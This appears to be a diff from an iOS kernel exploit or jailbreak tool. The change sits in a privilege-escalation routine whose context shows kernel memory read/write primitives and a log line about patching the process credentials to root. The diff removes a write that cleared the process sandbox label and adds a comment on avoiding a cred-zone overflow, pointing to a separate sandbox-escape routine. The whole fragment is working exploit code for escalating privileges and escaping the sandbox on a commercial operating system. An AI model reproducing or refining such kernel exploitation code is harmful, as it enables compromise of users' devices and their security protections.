@@ -437,17 +437,10 @@ static int prepareIOKitAccess(void) {
         kernel_logf("prepareIOKitAccess: ucred uid/gid fields patched to root");
     }
 
-    uint64_t crLabel = normalize_kernel_ptr(ds_kread64(ucred + 0x78));
-    if (crLabel) {
-        ds_kwrite64(ucred + 0x78, 0);
-        if (ds_kread64(ucred + 0x78) != 0) {
-            kernel_logf("prepareIOKitAccess: cr_label verify failed (non-critical)");
-            hadNonCriticalFailures = true;
-        }
-        kernel_logf("prepareIOKitAccess: sandbox label cleared");
-    } else {
-        kernel_logf("prepareIOKitAccess: sandbox label already null");
-    }
+    // Do not write to cr_label (ucred+0x78) here: the current kwrite primitive can perform
+    // a 32-byte operation and overflow the 144-byte cred zone object boundary on iOS 26.
+    // sbx_escape already handles sandbox extension patching, so skipping this write is safer.
+    kernel_logf("prepareIOKitAccess: skipping cr_label write to avoid cred zone overflow");
 
     uint32_t tfOff = find_task_flags_offset(task);
     if (tfOff) {
